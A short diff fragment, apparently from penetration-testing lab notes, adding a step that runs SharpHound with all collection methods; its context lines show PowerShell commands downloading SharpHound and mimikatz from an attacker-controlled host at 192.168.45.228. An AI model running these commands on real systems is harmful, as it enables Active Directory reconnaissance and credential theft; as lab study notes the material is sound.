@@ -126,6 +126,12 @@ iwr -uri "http://192.168.45.228:8888/SharpHound.exe" -outfile "C:\Users\joe\Down
 iwr -uri "http://192.168.45.228:8888/mimikatz.exe" -outfile "C:\Users\joe\Downloads\mimikatz.exe"
 ```
 
+Starting sharphound
+
+``` powershell
+.\sharp.exe --CollectionMethods All
+```
+
 
 
 
